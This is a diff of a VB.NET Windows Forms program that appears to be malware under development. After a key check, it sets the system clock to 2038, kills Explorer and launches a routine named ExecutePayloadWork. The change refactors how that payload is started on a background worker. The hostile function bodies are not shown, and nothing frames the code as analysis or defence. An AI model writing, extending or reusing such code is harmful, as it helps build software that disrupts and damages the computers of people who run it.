@@ -1355,23 +1355,12 @@ Public Class Form1
             ' 2. Set the system time to 2038
             SetSystemTimeTo2038()
 
-            ' Start ExecutePayload on a new thread
-            StartExecutePayload()
+            ' Start the background worker
+            BwPayloadWorker.RunWorkerAsync()
 
         Else
             MessageBox.Show("Incorrect key. Please try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
         End If
-    End Sub
-
-    ' Method to start the ExecutePayload operation using BackgroundWorker
-    Private Sub StartExecutePayload()
-        Dim payloadWorker As New BackgroundWorker()
-
-        ' Add event handler for DoWork
-        AddHandler payloadWorker.DoWork, AddressOf ExecutePayloadWork
-
-        ' Start the background worker
-        payloadWorker.RunWorkerAsync()
     End Sub
 
     Private Sub KillExplorerAndMore()
@@ -1506,6 +1495,14 @@ Public Class Form1
             WriteMessageToNotepad()
         Catch ex As Exception
             Console.WriteLine("Error in WriteMessageToNotepad: " & ex.Message)
+        End Try
+    End Sub
+
+    Private Sub BwPayloadWorker_DoWork(sender As Object, e As DoWorkEventArgs) Handles BwPayloadWorker.DoWork
+        Try
+            ExecutePayloadWork()
+        Catch ex As Exception
+            Console.WriteLine("Error in ExecutePayloadWork: " & ex.Message)
         End Try
     End Sub
 End Class
